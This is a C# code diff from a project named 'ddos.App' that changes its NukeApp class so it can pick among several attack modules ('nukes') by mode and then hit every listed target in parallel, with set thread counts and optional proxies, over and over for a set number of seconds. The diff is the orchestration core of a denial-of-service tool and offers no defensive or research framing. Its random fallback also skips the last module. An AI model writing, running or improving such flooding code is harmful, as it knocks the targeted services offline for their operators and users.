@@ -18,20 +18,20 @@ namespace ddos.App
         private readonly IServiceProvider _serviceProvider;
         private readonly ILogger _logger;
         private readonly ITargetsService _targetsService;
-        private readonly INuke _nuke;
+        private readonly IEnumerable<INuke> _nukes;
         private readonly IAppArgs _appArgs;
         public NukeApp(ILogger<NukeApp> logger,
                        IConfiguration configuration,
                        IServiceProvider serviceProvider,   
                        IAppArgs appArgs,
-                       INuke nuke,
+                       IEnumerable<INuke> nukes,
                        ITargetsService targetsService)            
         {
             _logger = logger ?? throw new ArgumentNullException(nameof(logger));
             _configuration = configuration ?? throw new ArgumentNullException(nameof(configuration));
             _serviceProvider = serviceProvider ?? throw new ArgumentNullException(nameof(serviceProvider));
             _targetsService = targetsService ?? throw new ArgumentNullException(nameof(targetsService));    
-            _nuke = nuke ?? throw new ArgumentNullException(nameof(nuke));
+            _nukes = nukes ?? throw new ArgumentNullException(nameof(nukes));
             _appArgs= appArgs ?? throw new ArgumentNullException(nameof(appArgs));
         }
 
@@ -64,13 +64,21 @@ namespace ddos.App
 
             while (sw.Elapsed < TimeSpan.FromSeconds(_appArgs.SecondsToRun))
             {
+                var nuke = _nukes.FirstOrDefault(_ => _.WhoAmI().Equals(_appArgs.Mode, StringComparison.InvariantCultureIgnoreCase));
+                if (nuke == null)
+                {
+                    _logger.LogInformation($"Can not find nuke with Mode {_appArgs.Mode}, random will be used");
+                    var r = new Random();
+                    nuke = _nukes.ToArray()[r.Next(0, _nukes.Count() - 1)];
+                }
+
                 try
                 {
                     await Task.Run(() =>
                     {
                         Parallel.ForEach(targets,
                                          new ParallelOptions() { CancellationToken = cancellationToken, MaxDegreeOfParallelism = _appArgs.Threads },
-                                         async dest => await _nuke.Boom(dest, _appArgs.UseProxy, cancellationToken)
+                                         async dest => await nuke.Boom(dest, _appArgs.UseProxy, cancellationToken)
                                          );
                     });
                 }
